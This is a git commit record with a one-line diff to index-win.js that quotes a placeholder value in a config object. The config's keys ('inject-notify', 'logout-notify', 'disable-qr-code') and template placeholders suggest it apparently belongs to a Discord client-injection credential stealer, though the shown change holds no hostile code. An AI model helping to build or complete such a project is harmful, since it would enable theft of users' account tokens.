bdc98a471c6ad39e91d86248ff780a3437ad8abb
TribhuXd <87581308+TribhuvanN@users.noreply.github.com>
2022-02-04 17:47:48 +0530

    Update index-win.js

--- index-win.js
+++ index-win.js
@@ -12,7 +12,7 @@ const config = {
     "inject-notify": "%INJECTNOTI%1",
     "logout-notify": "%LOGOUTNOTI%1",
     "init-notify":"%INITNOTI%1",
-    "embed-color": %MBEDCOLOR%1,
+    "embed-color": "%MBEDCOLOR%1",
     "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
